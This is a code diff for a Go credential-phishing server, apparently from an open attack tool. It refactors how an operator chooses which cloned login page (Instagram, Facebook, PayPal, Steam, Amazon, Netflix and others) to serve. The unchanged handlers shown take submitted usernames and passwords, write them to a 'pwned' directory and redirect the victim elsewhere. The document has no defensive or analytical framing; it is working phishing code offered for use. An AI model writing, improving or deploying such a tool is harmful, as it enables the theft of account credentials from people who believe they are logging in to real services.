@@ -34,6 +34,7 @@ import (
 }*/
 
 var choices map[int]string
+var siteSelection int
 
 // Login stores the user's login data
 type Login struct {
@@ -43,11 +44,11 @@ type Login struct {
 
 // ChoiceHandler stores the user's choice
 type ChoiceHandler struct {
-	Choice string
+	Choice int
 	Redir  string
 }
 
-// Defaults store's the connection defaults
+// Defaults store's the application defaults
 type Defaults struct {
 	Redirect string
 	BindIP   string
@@ -57,7 +58,9 @@ type Defaults struct {
 func main() {
 	initChoices()
 	displayMenu(true, "@DeadVCR", "http://deadvcr.com/")
+
 	var defaults Defaults
+
 	loaddefaults, err := ioutil.ReadFile("defaults.json")
 	if err != nil {
 		log.Fatal(err)
@@ -65,10 +68,11 @@ func main() {
 	json.Unmarshal([]byte(loaddefaults), &defaults)
 
 	choice, _ := userPrompt("[*] Choose an option: ")
-	_, err = validateChoice(choice)
+	choiceInt, err := validateChoice(choice)
 	if err != nil {
 		crash("Your input was invalid.", 2)
 	}
+	siteSelection = choiceInt
 	redir, _ := userPrompt("[*] Choose redirect URL (Default is " + defaults.Redirect + "): ")
 	listenip, _ := userPrompt("[*] Enter IP to listen on (Default is " + defaults.BindIP + "): ")
 	listenport, _ := userPrompt("[*] Enter port to listen on (Default is " + defaults.BindPort + "): ")
@@ -85,57 +89,10 @@ func main() {
 	if len(listenport) == 0 {
 		listenport = defaults.BindPort
 	}
-	bloatedChoiceHandler(choice)
-	loadTheWebMan(choice, listenip, listenport, redir)
-
+	loadTheWebMan(siteSelection, listenip, listenport, redir)
 }
 
-func bloatedChoiceHandler(choice string) string {
-	choice = strings.TrimSpace(choice)
-	returns := "default"
-	switch choice {
-	case "1":
-		returns = "instagram"
-	case "2":
-		returns = "facebook"
-	case "3":
-		returns = "twitter"
-	case "4":
-		returns = "google"
-	case "5":
-		returns = "paypal"
-	case "6":
-		returns = "steam"
-	case "7":
-		returns = "linkedin"
-	case "8":
-		returns = "ebay"
-	case "9":
-		returns = "cryptocurrency"
-	case "10":
-		returns = "adobe"
-	case "11":
-		returns = "messenger"
-	case "12":
-		returns = "twitch"
-	case "13":
-		returns = "badoo"
-	case "14":
-		returns = "devianart"
-	case "15":
-		returns = "snapchat"
-	case "16":
-		returns = "netflix"
-	case "17":
-		returns = "amazon"
-	}
-	if returns == "default" {
-		log.Fatal("Please enter a valid option. (Example: '1' for Instagram)")
-	}
-	return returns
-}
-
-func loadTheWebMan(choice, listenip, listenport, redir string) {
+func loadTheWebMan(choice int, listenip, listenport, redir string) {
 	choiceHandler := &ChoiceHandler{Choice: choice, Redir: redir}
 	http.HandleFunc("/login", choiceHandler.giveMeYourInfo)
 	http.HandleFunc("/", choiceHandler.epicTemplateLoader)
@@ -144,7 +101,7 @@ func loadTheWebMan(choice, listenip, listenport, redir string) {
 	log.Fatal(http.ListenAndServe(listenip+":"+listenport, nil))
 }
 
-func (p *Login) lmaoOwnedInfo(choice string) error {
+func (p *Login) lmaoOwnedInfo(choice int) error {
 	filename := p.Username + ".json"
 	var login Login
 	json.Unmarshal([]byte(filename), &login)
@@ -154,7 +111,7 @@ func (p *Login) lmaoOwnedInfo(choice string) error {
 		log.Fatal(err)
 	}
 
-	path := "pwned/" + choice
+	path := "pwned/" + choices[choice]
 
 	if _, err := os.Stat(path); os.IsNotExist(err) {
 		os.Mkdir(path, 0755)
@@ -168,9 +125,8 @@ func (p *Login) lmaoOwnedInfo(choice string) error {
 }
 
 func (ch *ChoiceHandler) epicTemplateLoader(w http.ResponseWriter, r *http.Request) {
-	theChoice := bloatedChoiceHandler(ch.Choice)
 	p := &Login{}
-	t, _ := template.ParseFiles("templates/" + theChoice + "/login.html")
+	t, _ := template.ParseFiles("templates/" + choices[siteSelection] + "/login.html")
 	t.Execute(w, p)
 }
 
@@ -183,8 +139,7 @@ func (ch *ChoiceHandler) giveMeYourInfo(w http.ResponseWriter, r *http.Request) 
 		http.Error(w, "Please enter a valid username or password!", 500)
 		return
 	}
-	theChoice := bloatedChoiceHandler(ch.Choice)
-	p.lmaoOwnedInfo(theChoice)
+	p.lmaoOwnedInfo(siteSelection)
 	http.Redirect(w, r, "//"+ch.Redir, http.StatusFound)
 }
 
